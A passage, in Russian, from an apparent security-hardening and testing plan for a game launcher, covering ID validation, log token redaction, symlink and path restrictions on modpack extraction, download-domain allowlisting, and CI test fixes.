   - В начале `instances::delete(paths, id, wipe)` добавить обязательный вызов `valid_id(id)?`.
   - Заменить вызов PowerShell в `recycle_dir` на прямой вызов Win32 API (`SHFileOperationW` / `IFileOperation`) через крейт `windows-sys`, исключив генерацию строковых PowerShell-команд.
3. **Безопасность логов и маскирование секретов (Приоритет: P1)**:
   - Перевести `util/redact.rs` на регулярные выражения, перехватывающие типовые паттерны токенов (`Bearer [A-Za-z0-9-_.]+`, `access_token=[^& \n]+`, `client_secret=[^& \n]+`).
   - Обернуть `GameLogLine` и запись в `log_file` в `instances/run.rs` в функцию маскирования `redact()`.
   - Очищать конфиденциальные данные из сообщений об ошибках HTTP перед передачей в `LauncherError`.
4. **Усиление Drag & Drop и скачивания модпаков (Приоритет: P1)**:
   - В `extract_zip_stripping` добавить обязательную проверку `if file.is_symlink() { continue; }`.
   - В `mrpack.rs` валидировать домены ссылок для скачивания: разрешать скачивание файлов только с `https://cdn.modrinth.com` (или запрашивать явное подтверждение пользователя при наличии сторонних хостов).
   - Ограничить целевые пути файлов из `.mrpack` каталогами контента (`mods/`, `resourcepacks/`, `shaderpacks/`).
5. **Покрытие тестами и стабилизация CI (Приоритет: P1/P2)**:
   - Написать интеграционный тест `instance_launch` с использованием локального mock-сервера (axum) и dummy-рантайма.
   - Заменить искусственные задержки `sleep` в тестах `download_engine` и `mrpack` на явную синхронизацию через `tokio::sync::Notify` / `tokio::sync::oneshot`.
   - Добавить Vitest и React Testing Library для изолированного компонентного тестирования интерфейса без необходимости запуска реального CDP-браузера.
